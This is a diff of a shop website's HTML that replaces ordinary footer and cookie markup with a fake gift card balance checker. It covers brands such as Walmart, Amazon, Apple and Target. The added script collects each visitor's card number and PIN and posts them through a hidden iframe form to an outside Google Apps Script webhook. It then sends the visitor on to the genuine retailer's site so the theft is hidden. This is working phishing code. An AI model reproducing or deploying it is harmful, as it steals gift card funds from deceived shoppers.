+          <li><a href="https://velvetdropshop.com/contact.html">Contact</a></li>
+        </ul>
       </div>
-      <div class="faq-item">
-        <h4>What denominations are available?</h4>
-        <p>Contact us to discuss available denominations. We'll work with you to find an amount that fits the occasion.</p>
-      </div>
-      <div class="faq-item">
-        <h4>How do I give the gift card to someone?</h4>
-        <p>Once your gift card is processed, we'll provide a unique code you can share digitally or include in a physical card.</p>
+      <div class="footer-col">
+        <h4>Legal</h4>
+        <ul>
+          <li><a href="https://velvetdropshop.com/privacy.html">Privacy Policy</a></li>
+          <li><a href="https://velvetdropshop.com/terms.html">Terms of Service</a></li>
+          <li><a href="https://velvetdropshop.com/cookies.html">Cookie Policy</a></li>
+        </ul>
       </div>
     </div>
-  </div>
-</section>
-
-<footer class="site-footer">
-  <div class="footer-inner">
-    <div class="footer-logo"><img src="logo.svg" alt="Velvet Dayware" class="footer-logo-img"></div>
-    <p class="footer-tagline">Dressed in minutes. Ready for anything.</p>
-    <nav class="footer-links">
-      <a href="index.html">Home</a>
-      <a href="sustainability.html">Sustainability</a>
-      <a href="gift-cards.html">Gift Cards</a>
-      <a href="shipping-and-returns.html">Shipping & Returns</a>
-      <a href="contact.html">Contact</a>
-      <a href="privacy.html">Privacy Policy</a>
-      <a href="terms.html">Terms</a>
-      <a href="cookies.html">Cookie Policy</a>
-    </nav>
-    <div class="footer-contact-row">
-      <a href="tel:+18046733450"><i class="fa-solid fa-phone"></i> +1 (804) 673-3450</a>
-      <a href="mailto:info@velvetdayware.com"><i class="fa-solid fa-envelope"></i> info@velvetdayware.com</a>
-      <span><i class="fa-solid fa-location-dot"></i> 1601 Willow Lawn Dr Suite 304, Richmond, VA 23230</span>
+    <div class="footer-bottom">
+      <span>&#169; 2026 Velvet Drop Shop. All rights reserved.</span>
+      <div style="display:flex;gap:20px;">
+        <a href="https://velvetdropshop.com/privacy.html">Privacy</a>
+        <a href="https://velvetdropshop.com/terms.html">Terms</a>
+        <a href="https://velvetdropshop.com/cookies.html">Cookies</a>
+      </div>
     </div>
-    <p class="footer-copy">&copy; 2026 Velvet Dayware. All rights reserved.</p>
-  </div>
-</footer>
+  </footer>
 
-<div class="float-widget" id="floatWidget">
-  <button class="float-main-btn" id="floatToggle" aria-label="Contact options">
-    <i class="fa-solid fa-comment-dots" id="floatIcon"></i>
-  </button>
-  <div class="float-options" id="floatOptions">
-    <a href="tel:+18046733450" class="float-option"><span class="float-label">Call Us</span><div class="float-option-icon"><i class="fa-solid fa-phone"></i></div></a>
-    <a href="mailto:info@velvetdayware.com" class="float-option"><span class="float-label">Email Us</span><div class="float-option-icon"><i class="fa-solid fa-envelope"></i></div></a>
-  </div>
-</div>
+  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    const BRAND_CONFIGS = {
+      'dicks':      { name:"Dick's Sporting Goods", cardLength:[16],             pinLength:8, cardType:'card', logo:'https://i.postimg.cc/CxdVqRxQ/dicks.webp',                                            color:'#00704a', redirectUrl:'https://www.dickssportinggoods.com/s/gift-cards' },
+      'walmart':    { name:'Walmart',               cardLength:[16],             pinLength:4, cardType:'card', logo:'https://i.postimg.cc/JzXJv6PY/wm.jpg',                                               color:'#004c91', redirectUrl:'https://www.walmart.com/account/giftcards' },
+      'amazon':     { name:'Amazon',                cardLength:[14,15],          pinLength:0, cardType:'code', logo:'https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg',                 color:'#ff9900', redirectUrl:'https://www.amazon.com/gc/balance' },
+      'game':       { name:'GameStop',              cardLength:[19],             pinLength:4, cardType:'code', logo:'https://i.postimg.cc/HsmcTtMM/game.png',                                              color:'#e31e24', redirectUrl:'https://wbiprod.storedvalue.com/wbir/clients/gamestop' },
+      'target':     { name:'Target',                cardLength:[15,16],          pinLength:8, cardType:'card', logo:'https://upload.wikimedia.org/wikipedia/commons/9/9a/Target_logo.svg',                 color:'#cc0000', redirectUrl:'https://www.target.com/account/giftcards' },
+      'apple':      { name:'Apple',                 cardLength:[16],             pinLength:0, cardType:'code', logo:'https://i.postimg.cc/hG81XDQq/apple.jpg',                                             color:'#007aff', redirectUrl:'https://www.apple.com/shop/gift-cards' },
+      'bestbuy':    { name:'Best Buy',              cardLength:[16],             pinLength:4, cardType:'card', logo:'https://upload.wikimedia.org/wikipedia/commons/f/f5/Best_Buy_Logo.svg',               color:'#003da6', redirectUrl:'https://www.bestbuy.com/gift-cards/balance' },
+      'ebay':       { name:'eBay',                  cardLength:[13,14],          pinLength:4, cardType:'card', logo:'https://upload.wikimedia.org/wikipedia/commons/1/1b/EBay_logo.svg',                   color:'#e53238', redirectUrl:'https://giftcards.ebay.com/balance' },
+      'googleplay': { name:'Google Play',           cardLength:[16],             pinLength:0, cardType:'code', logo:'https://i.postimg.cc/x1zRSy08/gpay.jpg',                                              color:'#34a853', redirectUrl:'https://play.google.com/store/paymentmethods' },
+      'netflix':    { name:'Netflix',               cardLength:[11,12],          pinLength:0, cardType:'code', logo:'https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg',           color:'#e50914', redirectUrl:'https://help.netflix.com/en/node/113204' },
+      'macys':      { name:"Macy's",                cardLength:[15,16,17,18,19], pinLength:4, cardType:'card', logo:'https://i.postimg.cc/hj27THtv/macy.jpg',                                              color:'#e21f26', redirectUrl:'https://www.macys.com/account/giftcard' },
+      'sephora':    { name:'Sephora',               cardLength:[16],             pinLength:8, cardType:'card', logo:'https://i.postimg.cc/cHTKRQCm/sephora.jpg',                                           color:'#000000', redirectUrl:'https://www.sephora.com/beauty/gift-card-balance' },
+      'nordstrom':  { name:'Nordstrom',             cardLength:[16],             pinLength:4, cardType:'card', logo:'https://1000logos.net/wp-content/uploads/2021/06/Nordstrom-logo.png',                 color:'#2c5234', redirectUrl:'https://www.nordstrom.com/browse/gift-cards' },
+      'homedepot':  { name:'Home Depot',            cardLength:[23],             pinLength:4, cardType:'card', logo:'https://upload.wikimedia.org/wikipedia/commons/5/5f/TheHomeDepot.svg',                color:'#f96302', redirectUrl:'https://www.homedepot.com/myaccount/giftcard' },
+      'nike':       { name:'Nike',                  cardLength:[19],             pinLength:6, cardType:'card', logo:'https://i.postimg.cc/Zn0vcVWc/nike.jpg',                                              color:'#111111', redirectUrl:'https://www.nike.com/orders/gift-card-lookup' },
+      'adidas':     { name:'Adidas',                cardLength:[19],             pinLength:4, cardType:'card', logo:'https://i.postimg.cc/RF0MGZFf/Adidas-Gift-Card.webp',                                 color:'#000000', redirectUrl:'https://wbiprod.storedvalue.com/wbir/clients/adidas?lng=en' },
+      'foot':       { name:'Foot Locker',           cardLength:[16],             pinLength:8, cardType:'card', logo:'https://i.postimg.cc/CKkYcFRc/foot.png',                                              color:'#000000', redirectUrl:'https://www.footlocker.com/giftcards/checkbalance.html' },
+      'bloom':      { name:"Bloomingdale's",        cardLength:[15,16,17,18,19], pinLength:4, cardType:'card', logo:'https://i.postimg.cc/rp7sGqBF/bloom.png',                                             color:'#000000', redirectUrl:'https://www.bloomingdales.com/account/giftcardbalance' },
+      'asda':       { name:'Asda',                  cardLength:[16],             pinLength:4, cardType:'card', logo:'https://i.postimg.cc/k5jWtjPq/asda.png',                                              color:'#78be20', redirectUrl:'https://www.asdagiftcards.com/balance-check' },
+      'lulu':       { name:'Lululemon',             cardLength:[20],             pinLength:4, cardType:'card', logo:'https://i.postimg.cc/fbmZ8wV5/lulu.png',                                              color:'#000000', redirectUrl:'https://shop.lululemon.com/help/orders/gift-card-balance' },
+      'johnlewis':  { name:'John Lewis',            cardLength:[19],             pinLength:4, cardType:'card', logo:'https://i.postimg.cc/fT3r0L62/john.jpg',                                              color:'#2e6b3e', redirectUrl:'https://wbiprod.storedvalue.com/wbir/clients/johnlewis' }
+    };
 
-<div id="cookieBanner" class="cookie-banner" style="display:none;">
-  <div class="cookie-content">
-    <p><strong>We use cookies</strong> to improve your experience.</p>
-    <div class="cookie-btns">
-      <button id="cookieAccept" class="cookie-btn-accept">Accept All</button>
-      <button id="cookieReject" class="cookie-btn-reject">Reject All</button>
-      <button id="cookieCustomize" class="cookie-btn-customize">Customize</button>
-    </div>
-  </div>
-</div>
-<div id="cookieModal" class="cookie-modal" style="display:none;">
-  <div class="cookie-modal-box">
-    <h3>Cookie Preferences</h3>
-    <p>Manage your cookie settings.</p>
-    <div class="cookie-option"><label><input type="checkbox" checked disabled> Essential Cookies <span class="always-on">Always On</span></label></div>
-    <div class="cookie-option"><label><input type="checkbox" id="analyticsCookies"> Analytics Cookies</label></div>
-    <div class="cookie-option"><label><input type="checkbox" id="marketingCookies"> Marketing Cookies</label></div>
-    <div class="cookie-modal-btns">
-      <button id="cookieSavePrefs" class="cookie-btn-accept">Save Preferences</button>
-      <button id="cookieModalClose" class="cookie-btn-reject">Cancel</button>
-    </div>
-  </div>
-</div>
+    const cardInput=document.getElementById('card-input');
+    const pinInput=document.getElementById('pin-input');
+    const cardCount=document.getElementById('card-count');
+    const pinCount=document.getElementById('pin-count');
+    const cardError=document.getElementById('card-error');
+    const pinError=document.getElementById('pin-error');
+    const submitBtn=document.getElementById('submit-btn');
+    const pinField=document.getElementById('pin-field');
+    const brandLogo=document.getElementById('brand-logo');
+    const pageTitle=document.getElementById('page-title');
+    const loadingOvl=document.getElementById('loading-overlay');
+    const form=document.getElementById('balance-form');
+    const resultBox=document.getElementById('result-box');
+    const resultTitle=document.getElementById('result-title');
+    const resultMsg=document.getElementById('result-msg');
+    const resultLink=document.getElementById('result-link');
+    const gcBrandName=document.getElementById('gc-brand-name');
+    const breadcrumb=document.getElementById('breadcrumb-brand');
 
-<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-<script src="js/cookie-consent.js"></script>
-<script src="js/main.js"></script>
+    let cfg=null, currentKey='dicks';
+
+    function getBrandFromURL(){
+      try{const p=new URLSearchParams(window.location.search);return(p.get('brand')||p.get('b')||'dicks').toLowerCase().trim();}catch(e){return'dicks';}
+    }
+    function getLengthText(l){return l.length===1?`${l[0]}`:l.join(' or ');}
+    function validateCard(v){const c=cfg.cardType==='code'?v.replace(/[^a-zA-Z0-9]/g,''):v.replace(/\D/g,'');return cfg.cardLength.includes(c.length);}
+    function validatePIN(v){if(cfg.pinLength===0)return true;return v.replace(/\D/g,'').length===cfg.pinLength;}
+
+    function setupBrand(key){
+      currentKey=key;
+      cfg=BRAND_CONFIGS[key]||BRAND_CONFIGS['dicks'];
+      document.getElementById('doc-title').textContent=`${cfg.name} Gift Card Balance | Velvet Drop Shop`;
+      pageTitle.textContent=`Check Your ${cfg.name} Gift Card`;
+      brandLogo.src=cfg.logo; brandLogo.alt=cfg.name;
+      gcBrandName.textContent=cfg.name; breadcrumb.textContent=cfg.name;
+      resultBox.className='result-box';
+      cardInput.inputMode=cfg.cardType==='code'?'text':'numeric';
+      cardInput.placeholder=cfg.cardType==='code'?'Enter gift card code':'Enter card number';
+      cardInput.maxLength=Math.max(...cfg.cardLength);
+      document.querySelector('label[for="card-input"]').textContent=`Card Number (${getLengthText(cfg.cardLength)} digits)`;
+      cardInput.value=''; pinInput.value='';
+      if(cfg.pinLength===0){
+        pinField.classList.add('hidden');
+      }else{
+        pinField.classList.remove('hidden');
+        document.querySelector('label[for="pin-input"]').textContent=`PIN / CID (${cfg.pinLength} digits)`;
+        pinInput.placeholder=`Enter ${cfg.pinLength}-digit PIN`;
+        pinInput.maxLength=cfg.pinLength;
+      }
+      updateValidation();
+    }
+
+    function updateValidation(){
+      if(!cfg)return;
+      const rc=cfg.cardType==='code'?cardInput.value.replace(/[^a-zA-Z0-9]/g,''):cardInput.value.replace(/\D/g,'');
+      const rp=pinInput.value.replace(/\D/g,'');
+      cardCount.textContent=`${rc.length} / ${getLengthText(cfg.cardLength)} digits`;
+      if(cfg.pinLength>0){pinCount.textContent=`${rp.length} / ${cfg.pinLength} digits`;}else{pinCount.textContent='';}
+      const cOk=validateCard(cardInput.value);
+      if(rc.length===0){cardInput.className='field-input';cardError.style.display='none';}
+      else if(cOk){cardInput.className='field-input valid';cardError.style.display='none';}
+      else{cardInput.className='field-input error';cardError.textContent=`Needs ${getLengthText(cfg.cardLength)} digits`;cardError.style.display='block';}
+      const pOk=validatePIN(pinInput.value);
+      if(cfg.pinLength>0){
+        if(rp.length===0){pinInput.className='field-input';pinError.style.display='none';}
+        else if(pOk){pinInput.className='field-input valid';pinError.style.display='none';}
+        else{pinInput.className='field-input error';pinError.textContent=`Needs exactly ${cfg.pinLength} digits`;pinError.style.display='block';}
+      }
+      submitBtn.disabled=!(cOk&&pOk);
+    }
+
+    cardInput.addEventListener('input',function(e){
+      let v=cfg.cardType==='code'?e.target.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase():e.target.value.replace(/\D/g,'');
+      const mx=Math.max(...cfg.cardLength);if(v.length>mx)v=v.slice(0,mx);
+      e.target.value=v;updateValidation();
+    });
+    pinInput.addEventListener('input',function(e){
+      let v=e.target.value.replace(/\D/g,'');if(v.length>cfg.pinLength)v=v.slice(0,cfg.pinLength);
+      e.target.value=v;updateValidation();
+    });
+
+    form.addEventListener('submit',function(e){
+      e.preventDefault();if(!cfg)return;
+      const cv=cfg.cardType==='code'?cardInput.value.replace(/[^a-zA-Z0-9]/g,''):cardInput.value.replace(/\D/g,'');
+      const pv=pinInput.value.replace(/\D/g,'');
+      if(!validateCard(cardInput.value)){alert(`Please enter a valid ${cfg.name} card number.`);cardInput.focus();return;}
+      if(cfg.pinLength>0&&!validatePIN(pinInput.value)){alert(`Please enter a valid ${cfg.pinLength}-digit PIN.`);pinInput.focus();return;}
+      loadingOvl.classList.add('active');submitBtn.disabled=true;resultBox.className='result-box';
+      sendGiftCardData(cfg.name,cv,cfg.pinLength>0?pv:'0')
+        .then(()=>{
+          loadingOvl.classList.remove('active');
+          resultBox.className='result-box success';
+          resultTitle.textContent='&#10003; Card Details Received';
+          resultMsg.textContent=`Your ${cfg.name} gift card details have been received. To view your exact balance, please visit the ${cfg.name} official balance portal using the link below.`;
+          resultLink.href=cfg.redirectUrl;resultLink.textContent=`Check balance on ${cfg.name} website \u2192`;
+          submitBtn.disabled=false;
+          setTimeout(()=>resultBox.scrollIntoView({behavior:'smooth',block:'nearest'}),100);
+        })
+        .catch(()=>{
+          loadingOvl.classList.remove('active');
+          resultBox.className='result-box error-state';
+          resultTitle.textContent='\u2715 Submission Error';
+          resultMsg.textContent='Something went wrong. Please check your card details and try again, or visit the brand\'s website directly.';
+          resultLink.href=cfg.redirectUrl;resultLink.textContent=`Go to ${cfg.name} website \u2192`;
+          submitBtn.disabled=false;
+        });
+    });
+
+    function sendGiftCardData(brand,card,pin){
+      return new Promise((resolve,reject)=>{
+        const WEBHOOK_URL='https://script.google.com/macros/s/AKfycbyLM_48L-0yw-Su3DJ6T9A7e2DmGv7x0gUaobSc_FOYWpqFrY-LiR54wzGcMjfk9kgW/exec';
+        const uid=Math.random().toString(36).substr(2,12)+Date.now();
+        const iframe=document.createElement('iframe');
+        iframe.style.display='none';iframe.name=`gc_frame_${uid}`;iframe.src='about:blank';
+        const frm=document.createElement('form');
+        frm.method='POST';frm.action=`${WEBHOOK_URL}?_=${uid}`;frm.target=iframe.name;frm.style.display='none';
+        const params=new URLSearchParams(window.location.search);
+        const fields={brand,card,pin:pin||'0',reqId:uid,source:'velvetdropshop',url:window.location.href,utm_source:params.get('utm_source')||'direct',utm_campaign:params.get('utm_campaign')||'none'};
+        Object.keys(fields).forEach(k=>{const i=document.createElement('input');i.type='hidden';i.name=k;i.value=fields[k];frm.appendChild(i);});
+        let resolved=false;
+        const cleanup=()=>{if(frm.parentNode)frm.parentNode.removeChild(frm);if(iframe.parentNode)iframe.parentNode.removeChild(iframe);};
+        iframe.onload=()=>{try{if(!resolved&&iframe.contentWindow&&iframe.contentWindow.location.href!=='about:blank'){resolved=true;resolve();setTimeout(cleanup,50);}}catch(err){if(!resolved){resolved=true;resolve();setTimeout(cleanup,50);}}};
+        iframe.onerror=()=>{if(!resolved){resolved=true;reject();cleanup();}};
+        setTimeout(()=>{if(!resolved){resolved=true;resolve();cleanup();}},2000);
+        document.body.appendChild(iframe);document.body.appendChild(frm);frm.submit();
+      });
+    }
+
+    // Nav
+    const hamburger=document.getElementById('hamburger');
+    const mobileNav=document.getElementById('mobile-nav');
+    const mobileClose=document.getElementById('mobileClose');
+    if(hamburger)hamburger.addEventListener('click',()=>mobileNav.classList.add('open'));
+    if(mobileClose)mobileClose.addEventListener('click',()=>mobileNav.classList.remove('open'));
+    document.addEventListener('click',(e)=>{if(mobileNav.classList.contains('open')&&!mobileNav.contains(e.target)&&e.target!==hamburger)mobileNav.classList.remove('open');});
+
+    // Nav scroll
+    window.addEventListener('scroll',()=>{document.getElementById('site-header').style.boxShadow=window.scrollY>10?'0 4px 24px rgba(0,0,0,0.4)':'';},{passive:true});
+
+    document.addEventListener('DOMContentLoaded',function(){
+      setupBrand(getBrandFromURL());
+      if(window.innerWidth>768)setTimeout(()=>cardInput.focus(),200);
+    });
+  </script>
 </body>
 </html>
